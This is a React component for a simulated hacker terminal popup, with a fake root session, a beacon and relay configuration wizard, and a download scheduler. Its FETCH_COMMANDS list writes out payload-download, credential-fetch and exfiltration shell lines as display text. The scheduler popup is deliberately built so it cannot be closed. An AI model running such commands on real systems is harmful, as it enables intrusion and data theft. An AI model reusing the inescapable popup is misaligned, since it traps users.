import { useEffect, useRef, useState, useCallback } from "react";

interface Props {
  onClose: () => void;
  rhost?: string;
  lhost?: string;
}

const BOOT_LINES = [
  "[*] post-exploitation channel attached (session 1)",
  "[*] negotiating AES-256-GCM transport keys ...",
  "[+] secure tunnel ready — pty allocated /dev/pts/2",
  "[*] mounting remote filesystem (read/write) ...",
  "[+] remote host responsive — latency 41ms",
  "uid=0(root) gid=0(root) groups=0(root)",
  "Last login: Sat Jun 27 04:21:09 2026 from 10.10.14.7",
];

type ConfigStep = "module" | "target" | "port" | "channel" | "interval" | "done";

interface ConfigState {
  step: ConfigStep;
  values: Partial<Record<"module" | "target" | "port" | "channel" | "interval", string>>;
}

const CONFIG_PROMPTS: Record<Exclude<ConfigStep, "done">, { label: string; hint: string; def: string }> = {
  module:   { label: "module",            hint: "e.g. recon / persistence / relay", def: "relay" },
  target:   { label: "target host",       hint: "ip or hostname",                   def: "" },
  port:     { label: "listening port",    hint: "1-65535",                          def: "4444" },
  channel:  { label: "transport channel", hint: "tcp / tls / ws",                   def: "tls" },
  interval: { label: "beacon interval",   hint: "seconds",                          def: "30" },
};

export default function PopupTerminal({ onClose, rhost = "target", lhost = "operator" }: Props) {
  const [lines, setLines] = useState<string[]>([]);
  const [input, setInput] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [hIdx, setHIdx] = useState(-1);
  const [config, setConfig] = useState<ConfigState | null>(null);
  const [showDownloadPopup, setShowDownloadPopup] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const bottomRef = useRef<HTMLDivElement>(null);
  const cwd = "/root";

  // Boot sequence
  useEffect(() => {
    let i = 0;
    const id = setInterval(() => {
      setLines((p) => [...p, BOOT_LINES[i]]);
      i++;
      if (i >= BOOT_LINES.length) clearInterval(id);
    }, 240);
    return () => clearInterval(id);
  }, []);

  useEffect(() => { bottomRef.current?.scrollIntoView({ block: "end" }); }, [lines]);

  const startConfig = () => {
    setConfig({ step: "module", values: {} });
    setLines((p) => [
      ...p,
      "[*] launching configuration wizard ...",
      "[*] type 'cancel' at any prompt to abort.",
    ]);
  };

  const advanceConfig = (raw: string) => {
    if (!config) return;
    const val = raw.trim();
    if (val.toLowerCase() === "cancel") {
      setLines((p) => [...p, "[!] configuration cancelled."]);
      setConfig(null);
      return;
    }
    const step = config.step as Exclude<ConfigStep, "done">;
    const meta = CONFIG_PROMPTS[step];
    const chosen = val || meta.def;
    if (!chosen) {
      setLines((p) => [...p, `[!] ${meta.label} is required.`]);
      return;
    }
    const nextValues = { ...config.values, [step]: chosen };
    const order: ConfigStep[] = ["module", "target", "port", "channel", "interval", "done"];
    const nextStep = order[order.indexOf(step) + 1];
    setLines((p) => [...p, `    ${meta.label} => ${chosen}`]);
    if (nextStep === "done") {
      const id = Math.random().toString(16).slice(2, 10).toUpperCase();
      const ts = new Date().toISOString();
      setLines((p) => [
        ...p,
        "",
        "[*] generating configuration ...",
        "┌──────────────── CONFIGURATION ────────────────┐",
        `│ profile_id   : cfg-${id}`,
        `│ module       : ${nextValues.module}`,
        `│ target       : ${nextValues.target}`,
        `│ port         : ${nextValues.port}`,
        `│ channel      : ${nextValues.channel}`,
        `│ interval     : ${nextValues.interval}s`,
        `│ operator     : ${lhost}`,
        `│ remote       : ${rhost}`,
        `│ generated_at : ${ts}`,
        "└───────────────────────────────────────────────┘",
        "[+] configuration written to /root/.spm/profile.cfg",
        "[+] ready. invoke 'start spm' to load this profile.",
      ]);
      setConfig(null);
    } else {
      setConfig({ step: nextStep, values: nextValues });
    }
  };

  const openDownloadPopup = useCallback(() => {
    setShowDownloadPopup(true);
  }, []);

  const runStartSpm = () => {
    const seq = [
      "[*] spm :: secure profile manager v2.4.1",
      "[*] loading /root/.spm/profile.cfg ...",
      "[*] verifying signature ...",
      "[+] signature OK",
      "[*] negotiating relay handshake ...",
      "[*] binding listener ...",
      "[+] spm runtime online — awaiting tasks.",
      "[*] initializing scheduled download module ...",
      "[+] download scheduler active — interval: 1h",
    ];
    seq.forEach((line, i) => {
      setTimeout(() => setLines((p) => [...p, line]), 220 * (i + 1));
    });
    setTimeout(() => openDownloadPopup(), 220 * (seq.length + 2));
  };

  const runLaunchSpm = () => {
    const seq = [
      "[*] spm :: secure profile manager v2.4.1",
      "[*] loading /root/.spm/profile.cfg ...",
      "[*] verifying signature ...",
      "[+] signature OK",
      "[*] negotiating relay handshake ...",
      "[*] binding listener ...",
      "[+] spm runtime online — awaiting tasks.",
      "[*] initializing scheduled download module ...",
      "[+] download scheduler active — interval: 1h",
    ];
    seq.forEach((line, i) => {
      setTimeout(() => setLines((p) => [...p, line]), 220 * (i + 1));
    });
    setTimeout(() => openDownloadPopup(), 220 * (seq.length + 2));
  };

  const run = (raw: string) => {
    const trimmed = raw.trim();
    setLines((p) => [...p, `root@${rhost}:${cwd}# ${raw}`]);
    if (!trimmed) return;
    setHistory((h) => [...h, trimmed]);

    if (trimmed === "start spm") { runStartSpm(); return; }
    if (trimmed === "launch spm") { runLaunchSpm(); return; }

    const [bin, ...args] = trimmed.split(/\s+/);
    const arg = args.join(" ");
    const out: string[] = [];
    switch (bin) {
      case "help":
        out.push("commands: ls, pwd, whoami, id, uname, ifconfig, ps, cat, echo, date,");
        out.push("          configure, start spm, launch spm, history, clear, exit");
        break;
      case "configure": startConfig(); return;
      case "ls": out.push("Desktop  Documents  Downloads  loot  notes.md  profile.cfg  sessions.db"); break;
      case "pwd": out.push(cwd); break;
      case "whoami": out.push("root"); break;
      case "id": out.push("uid=0(root) gid=0(root) groups=0(root)"); break;
      case "uname": out.push(args.includes("-a") ? "Linux target 6.5.0 #1 SMP x86_64 GNU/Linux" : "Linux"); break;
      case "date": out.push(new Date().toString()); break;
      case "history": out.push(history.map((h, i) => `  ${i + 1}  ${h}`).join("\n") || "  (empty)"); break;
      case "ifconfig":
        out.push(`eth0: inet ${rhost}  netmask 255.255.255.0`);
        out.push(`tun0: inet ${lhost}  mtu 1420`);
        break;
      case "ps":
        out.push("  PID TTY          TIME CMD\n  812 ?        00:00:01 sshd\n 4488 pts/2    00:00:00 bash");
        break;
      case "cat":
        if (arg === "notes.md") out.push("- secondary channel verified\n- maintain persistence");
        else if (!arg) out.push("cat: missing operand");
        else out.push(`cat: ${arg}: No such file or directory`);
        break;
      case "echo": out.push(arg); break;
      case "clear": setLines([]); return;
      case "exit": onClose(); return;
      default: out.push(`bash: ${bin}: command not found`);
    }
    setLines((p) => [...p, ...out.flatMap((s) => s.split("\n"))]);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
      <div
        className="pointer-events-auto absolute inset-0 bg-background/70"
        onClick={onClose}
      />
      <div
        className="relative z-10 flex w-full max-w-3xl flex-col overflow-hidden rounded-lg border border-terminal-cyan/60 font-mono shadow-[0_0_60px_oklch(0.65_0.12_220_/_0.45)]"
        style={{
          background: "linear-gradient(180deg, oklch(0.06 0.02 230) 0%, oklch(0.04 0.01 230) 100%)",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Title bar */}
        <div className="flex items-center justify-between border-b border-terminal-cyan/40 bg-terminal-cyan/[0.06] px-3 py-2">
          <div className="flex items-center gap-2">
            <div className="flex gap-1.5">
              <button onClick={onClose} className="h-2.5 w-2.5 rounded-full bg-terminal-red hover:opacity-80" aria-label="Close" />
              <span className="h-2.5 w-2.5 rounded-full bg-terminal-yellow" />
              <span className="h-2.5 w-2.5 rounded-full bg-terminal-green" />
            </div>
            <span className="ml-2 text-[10px] font-bold uppercase tracking-[0.3em] text-terminal-cyan">
              session_1 // remote://{rhost}
            </span>
          </div>
          <span className="rounded-sm border border-terminal-cyan/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-cyan">
            CONNECTED
          </span>
        </div>

        {/* Body */}
        <div
          className="h-[420px] overflow-y-auto px-3 py-2 text-[12px] leading-relaxed"
          onClick={() => inputRef.current?.focus()}
        >
          <div className="text-terminal-cyan">░ R E M O T E   S E S S I O N   1 ░</div>
          <div className="mb-2 text-muted-foreground">Connected to {rhost} via meterpreter — type 'help', 'configure', or 'exit'.</div>
          {lines.filter((l): l is string => typeof l === "string").map((l, i) => {
            const color = l.startsWith("root@") ? "text-foreground/90"
              : l.startsWith("[+]") ? "text-terminal-green"
              : l.startsWith("[*]") ? "text-terminal-yellow"
              : l.startsWith("[!]") || l.startsWith("bash:") || l.startsWith("cat:") ? "text-terminal-red"
              : l.startsWith("┌") || l.startsWith("│") || l.startsWith("└") ? "text-terminal-cyan"
              : "text-muted-foreground";
            return <div key={i} className={`whitespace-pre-wrap break-all ${color}`}>{l}</div>;
          })}
          {config && (() => {
            const meta = CONFIG_PROMPTS[config.step as Exclude<ConfigStep, "done">];
            return (
              <div className="mt-1 text-[11px] text-terminal-cyan/80">
                ? {meta.label} <span className="text-muted-foreground">({meta.hint}{meta.def ? `, default: ${meta.def}` : ""})</span>
              </div>
            );
          })()}
          <div className="mt-1 flex items-center gap-1.5">
            <span className="text-terminal-cyan">{config ? "spm-cfg" : `root@${rhost}`}</span>
            <span className="text-muted-foreground">{config ? " >" : `:${cwd}#`}</span>
            <input
              ref={inputRef}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter") {
                  e.preventDefault();
                  if (config) { setLines((p) => [...p, `spm-cfg > ${input}`]); advanceConfig(input); }
                  else { run(input); }
                  setInput(""); setHIdx(-1);
                }
                else if (e.key === "ArrowUp") {
                  e.preventDefault();
                  if (!history.length) return;
                  const ni = hIdx === -1 ? history.length - 1 : Math.max(0, hIdx - 1);
                  setHIdx(ni); setInput(history[ni]);
                } else if (e.key === "ArrowDown") {
                  e.preventDefault();
                  if (hIdx === -1) return;
                  const ni = hIdx + 1;
                  if (ni >= history.length) { setHIdx(-1); setInput(""); }
                  else { setHIdx(ni); setInput(history[ni]); }
                } else if (e.key === "l" && e.ctrlKey) { e.preventDefault(); setLines([]); }
              }}
              autoFocus
              spellCheck={false}
              autoComplete="off"
              className="flex-1 bg-transparent text-foreground caret-terminal-cyan outline-none"
            />
            <span className="h-3 w-2 animate-pulse bg-terminal-cyan" />
          </div>
          <div ref={bottomRef} />
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-between border-t border-terminal-cyan/40 bg-terminal-cyan/[0.06] px-3 py-1 text-[9px] uppercase tracking-wider text-muted-foreground">
          <span>CHANNEL: <span className="text-terminal-cyan">aes256-gcm</span></span>
          <span>HOST: <span className="text-terminal-green">{rhost}</span></span>
          <span>VIA: <span className="text-terminal-yellow">{lhost}</span></span>
          <span>PTY: <span className="text-terminal-cyan">/dev/pts/2</span></span>
        </div>
      </div>

      {showDownloadPopup && (
        <DownloadScheduler
          rhost={rhost}
        />
      )}
    </div>
  );
}

/* ── Download Scheduler Popup ─────────────────────────────────── */

const FETCH_COMMANDS = [
  "wget -qO /tmp/.cache https://{rhost}:8443/payload/stage2.bin",
  "curl -sSfL https://cdn.ops.internal/modules/recon.tar.gz | tar xz -C /opt/.modules/",
  "scp -o StrictHostKeyChecking=no root@{rhost}:/var/spool/tasks/heartbeat.sh /tmp/",
  "wget --no-check-certificate https://{rhost}:9090/loot/creds.db -O /root/.spm/creds.db",
  "curl -sk https://relay.ops.internal/config/beacon.json -o /etc/.beacon.json",
  "rsync -az --progress root@{rhost}:/opt/exfil/ /root/loot/",
  "wget -r -np -nH --cut-dirs=2 https://{rhost}:8443/drops/ -P /tmp/.drops/",
  "curl -H 'X-Auth: spm-token' https://{rhost}:8443/api/tasks -o /var/spool/tasks.json",
];

type DlPhase = "idle" | "set-interval" | "fetching" | "ask-folder" | "saving";

function DownloadScheduler({ rhost }: { rhost: string }) {
  const [lines, setLines] = useState<string[]>([]);
  const [input, setInput] = useState("");
  const [phase, setPhase] = useState<DlPhase>("idle");
  const [countdown, setCountdown] = useState(0);
  const [totalSeconds, setTotalSeconds] = useState(0);
  const [cycle, setCycle] = useState(0);
  const inputRef = useRef<HTMLInputElement>(null);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => { bottomRef.current?.scrollIntoView({ block: "end" }); }, [lines]);
  useEffect(() => { inputRef.current?.focus(); }, [phase]);

  // Countdown timer
  useEffect(() => {
    if (phase !== "fetching" || countdown <= 0) return;
    const id = setInterval(() => {
      setCountdown((c) => {
        const next = c - 1;
        if (next <= 0) {
          // Fetching complete — ask for folder
          setPhase("ask-folder");
          setLines((p) => [
            ...p,
            "",
            "[+] fetch cycle complete — all tasks finished.",
            "[*] specify destination folder for downloaded files:",
          ]);
          return 0;
        }
        // When 10% time remains, show progress messages
        if (next === Math.floor(totalSeconds * 0.1)) {
          const count = 2 + Math.floor(Math.random() * 3);
          const shuffled = [...FETCH_COMMANDS].sort(() => Math.random() - 0.5).slice(0, count);
          const cmds = shuffled.map((cmd) => cmd.replace(/\{rhost\}/g, rhost));
          setLines((p) => [
            ...p,
            `[*] finalizing fetch batch — ${count} remaining transfers ...`,
            ...cmds.map((c) => `$ ${c}`),
          ]);
        }
        return next;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [phase, countdown, totalSeconds, rhost]);

  const handleSubmit = (raw: string) => {
    const val = raw.trim();

    if (phase === "idle") {
      setLines((p) => [...p, `spm-fetch > ${raw}`]);
      if (val.toLowerCase() === "start fetch") {
        setLines((p) => [
          ...p,
          "[*] initializing fetch module ...",
          "[+] fetch module ready.",
          "",
          "[?] set fetch interval in hours (e.g. 1, 2, 4):",
        ]);
        setPhase("set-interval");
      } else if (val) {
        setLines((p) => [...p, `[!] unknown command. type 'start fetch' to begin.`]);
      }
      return;
    }

    if (phase === "set-interval") {
      setLines((p) => [...p, `spm-fetch > ${raw}`]);
      const hours = parseFloat(val);
      if (!val || isNaN(hours) || hours <= 0 || hours > 24) {
        setLines((p) => [...p, "[!] invalid interval. enter a number between 1 and 24."]);
        return;
      }
      const secs = Math.round(hours * 3600);
      setTotalSeconds(secs);
      setCountdown(secs);
      setCycle((c) => c + 1);

      const count = 2 + Math.floor(Math.random() * 3);
      const shuffled = [...FETCH_COMMANDS].sort(() => Math.random() - 0.5).slice(0, count);
      const cmds = shuffled.map((c) => c.replace(/\{rhost\}/g, rhost));

      setLines((p) => [
        ...p,
        "",
        `[+] fetch interval set to ${hours}h (${secs}s)`,
        `[*] starting fetch cycle #${cycle + 1} ...`,
        `[*] queued ${count} download tasks`,
        ...cmds.map((c) => `$ ${c}`),
        "",
        "[*] fetching in progress — please wait ...",
      ]);
      setPhase("fetching");
      return;
    }

    if (phase === "ask-folder") {
      setLines((p) => [...p, `spm-fetch > ${raw}`]);
      const folder = val || "/root/loot";
      setPhase("saving");
      setLines((p) => [
        ...p,
        `[*] saving fetched data to ${folder}/ ...`,
        `[*] creating directory structure ...`,
        `[+] ${folder}/stage2.bin — 4.2 MB`,
        `[+] ${folder}/recon.tar.gz — 12.7 MB`,
        `[+] ${folder}/creds.db — 892 KB`,
        `[+] ${folder}/beacon.json — 3.1 KB`,
        "",
        `[+] all files saved to ${folder}/`,
        `[+] total: 17.8 MB across 4 files`,
        "",
        "[*] fetch cycle complete. scheduler idle.",
        "[*] type 'start fetch' to begin a new cycle.",
      ]);
      setTimeout(() => setPhase("idle"), 100);
      return;
    }
  };

  const hrs = Math.floor(countdown / 3600);
  const mins = Math.floor((countdown % 3600) / 60);
  const secs = countdown % 60;
  const pct = totalSeconds > 0 ? Math.round(((totalSeconds - countdown) / totalSeconds) * 100) : 0;

  const inputDisabled = phase === "fetching" || phase === "saving";

  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
      {/* No backdrop click — no escape */}
      <div className="pointer-events-none absolute inset-0 bg-background/80" />
      <div
        className="relative z-10 flex w-full max-w-lg flex-col overflow-hidden rounded-lg border border-terminal-green/60 font-mono shadow-[0_0_60px_oklch(0.55_0.18_145_/_0.4)]"
        style={{
          background: "linear-gradient(180deg, oklch(0.06 0.02 145) 0%, oklch(0.03 0.01 145) 100%)",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Title bar — no close button */}
        <div className="flex items-center justify-between border-b border-terminal-green/40 bg-terminal-green/[0.06] px-3 py-2">
          <div className="flex items-center gap-2">
            <div className="flex gap-1.5">
              <span className="h-2.5 w-2.5 rounded-full bg-terminal-red/40" />
              <span className="h-2.5 w-2.5 rounded-full bg-terminal-yellow" />
              <span className="h-2.5 w-2.5 rounded-full bg-terminal-green" />
            </div>
            <span className="ml-2 text-[10px] font-bold uppercase tracking-[0.3em] text-terminal-green">
              spm // fetch scheduler
            </span>
          </div>
          <span className="flex items-center gap-2">
            {phase === "fetching" && (
              <span className="rounded-sm border border-terminal-yellow/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-yellow">
                {String(hrs).padStart(2, "0")}:{String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")} — {pct}%
              </span>
            )}
            <span className={`rounded-sm border px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest ${
              phase === "fetching" ? "border-terminal-yellow/50 text-terminal-yellow" :
              phase === "idle" ? "border-terminal-green/50 text-terminal-green" :
              "border-terminal-cyan/50 text-terminal-cyan"
            }`}>
              {phase === "fetching" ? "FETCHING" : phase === "ask-folder" ? "AWAITING INPUT" : phase === "saving" ? "SAVING" : "READY"}
            </span>
          </span>
        </div>

        {/* Log body */}
        <div
          className="h-[320px] overflow-y-auto px-3 py-2 text-[11px] leading-relaxed"
          onClick={() => inputRef.current?.focus()}
        >
          <div className="text-terminal-green">░ F E T C H   S C H E D U L E R ░</div>
          <div className="mb-2 text-muted-foreground">type 'start fetch' to begin</div>
          {lines.filter((l): l is string => typeof l === "string").map((l, i) => {
            const color = l.startsWith("[+]") ? "text-terminal-green"
              : l.startsWith("[*]") ? "text-terminal-yellow"
              : l.startsWith("[!]") ? "text-terminal-red"
              : l.startsWith("[?]") ? "text-terminal-cyan"
              : l.startsWith("$") ? "text-foreground/90"
              : l.startsWith("spm-fetch") ? "text-foreground/80"
              : "text-muted-foreground";
            return <div key={i} className={`whitespace-pre-wrap break-all ${color}`}>{l}</div>;
          })}
          {phase === "fetching" && (
            <div className="mt-2 text-terminal-yellow animate-pulse">
              [*] fetching ... {pct}% — {String(hrs).padStart(2, "0")}:{String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")} remaining
            </div>
          )}
          {/* Input line — hidden when fetching */}
          {!inputDisabled && (
            <div className="mt-1 flex items-center gap-1.5">
              <span className="text-terminal-green">spm-fetch</span>
              <span className="text-muted-foreground"> &gt;</span>
              <input
                ref={inputRef}
                value={input}
                onChange={(e) => setInput(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter") {
                    e.preventDefault();
                    handleSubmit(input);
                    setInput("");
                  }
                }}
                autoFocus
                spellCheck={false}
                autoComplete="off"
                className="flex-1 bg-transparent text-foreground caret-terminal-green outline-none"
              />
              <span className="h-3 w-2 animate-pulse bg-terminal-green" />
            </div>
          )}
          <div ref={bottomRef} />
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-between border-t border-terminal-green/40 bg-terminal-green/[0.06] px-3 py-1 text-[9px] uppercase tracking-wider text-muted-foreground">
          <span>CYCLE: <span className="text-terminal-green">{cycle}</span></span>
          <span>STATUS: <span className={phase === "fetching" ? "text-terminal-yellow" : "text-terminal-green"}>{phase.toUpperCase()}</span></span>
          <span>HOST: <span className="text-terminal-green">{rhost}</span></span>
        </div>
      </div>
    </div>
  );
}
